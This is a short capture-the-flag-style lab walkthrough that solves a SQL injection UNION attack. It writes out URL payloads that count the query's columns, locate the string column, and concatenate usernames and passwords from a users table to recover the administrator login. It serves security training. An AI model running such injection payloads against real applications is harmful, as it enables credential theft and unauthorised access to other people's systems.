Difficulty : `Practitioner`

## ðŸŽ¯ Goal 

The database contains a new table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## âœ… Solution

First we need to know how many columns are returned by the query:

````text
<website>/filter?category=Pets' UNION SELECT NULL--    # error!
<website>/filter?category=Pets' UNION SELECT NULL,NULL--    # works
<website>/filter?category=Pets' UNION SELECT NULL,NULL,NULL--    # error!
````

We now know there are 2 columns. Time to test where is the string data:

````text
<website>/filter?category=Pets' UNION SELECT 'abc',NULL--   # error!
<website>/filter?category=Pets' UNION SELECT NULL,'abc'--   # works
````

Ok the second column is a string one. To extract both users and passwords columns we will have to concatenate them into just one columns using the special operator `<string> || <string>` (can vary according to the DBMS).

Letâ€™s try on the full request now:

````text
<website>/filter?category=Gifts' UNION SELECT NULL,username || '~' || password FROM users-- # administrator~password
````
